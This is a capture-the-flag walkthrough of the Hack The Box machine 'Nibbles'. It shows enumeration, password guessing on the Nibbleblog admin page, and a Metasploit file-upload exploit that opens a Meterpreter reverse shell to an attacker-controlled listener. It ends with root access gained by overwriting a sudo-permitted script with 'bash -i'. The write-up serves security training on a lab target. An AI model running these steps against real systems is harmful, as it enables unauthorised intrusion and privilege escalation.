# Nibbles

URL: https://app.hackthebox.com/machines/Nibbles

Level: Easy

Date 2 Jun 2020

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.80 scan initiated Tue Jun  2 21:30:42 2020 as: nmap -T4 -A -p- -oN Nibbles_nmap.txt 10.10.10.75
Nmap scan report for 10.10.10.75
Host is up (0.045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

We search for `Apache 2.4.18` exploit:

```
root@kali:/opt/htb/Nibbles# searchsploit apache 2.4
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                        | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                      | php/remote/29316.py
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                                                                                      | unix/remote/30835.sh
Apache 2.4.17 - Denial of Service                                                                                                                                                                      | windows/dos/39037.php
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                                                                                                  | linux/local/46676.php
Apache 2.4.23 mod_http2 - Denial of Service                                                                                                                                                            | linux/dos/40909.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                                                                                        | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                                                                                           | linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                       | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                    | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                   | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                             | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                             | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                                                    | linux/webapps/39642.txt
Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)                                                                                                                                       | multiple/remote/48410.rb
Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                                                                                     | multiple/remote/21492.txt
Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                                                                                        | multiple/remote/21490.txt
Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                                                                | multiple/remote/21491.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                                      | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                                                    | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                                              | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                           | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                           | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                                           | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                                       | linux/remote/34.pl
```


We look at HTML source and we discover an interesting comment:

```
 <!-- /nibbleblog/ directory. Nothing interesting here! --> <!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Then, we search again for `nibble`:

```
 root@kali:/opt/htb/Nibbles# searchsploit nibble
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                                                 | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                  | php/remote/38489.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
  msf5 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


msf5 > use exploit/multi/http/nibbleblog_file_upload
msf5 exploit(multi/http/nibbleblog_file_upload) > info


Description:
  Nibbleblog contains a flaw that allows an authenticated remote
  attacker to execute arbitrary PHP code. This module was tested on
  version 4.0.3.
```

So we need to authenticate.

We try some credentials:

http://10.10.10.75/nibbleblog/admin.php


And we capture POST request:

```
POST /nibbleblog/admin.php HTTP/1.1
Host: 10.10.10.75
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.75/nibbleblog/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Cookie: PHPSESSID=3l0g5av9q1aah9fr0p32mspn25
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

We then use Burpsuite, and we create a simple wordlist:

`
admin
nibble
blog
nibbles
`

Thanks to "Intruder" feature, we discover that `admin:nibbles` is a valid combination.

Now, we can fully configure `msfconsole`:

```
msf5 > use exploit/multi/http/nibbleblog_file_upload
msf5 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.10.10.75
RHOSTS => 10.10.10.75
msf5 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf5 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf5 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf5 exploit(multi/http/nibbleblog_file_upload) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.75      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog      yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.36      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

msf5 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.36:4444
[*] Sending stage (38288 bytes) to 10.10.10.75
[*] Meterpreter session 3 opened (10.10.14.36:4444 -> 10.10.10.75:44296) at 2020-06-28 18:28:24 +0200
[+] Deleted image.php


meterpreter >
meterpreter >
```

We were able to upload our malicious script and get a shell.

# User-flag

We are now "nibbler" user:

```
meterpreter >
meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > shell
Process 2201 created.
Channel 0 created.


id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
whoami
nibbler
```

# Privesc

We check for some basic privesc technique:

```
pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
sudo -l

sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We are allowed to run `monitor.sh` script with root privilege.

We need to replace it with a shell:

```
cd /home/nibbler
dir
mkdir -p personal/stuff
cd personal/stuff
echo "bash -i" > /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh

id
sudo: unable to resolve host Nibbles: Connection timed out
bash: cannot set terminal process group (1332): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# id
uid=0(root) gid=0(root) groups=0(root)
```
	


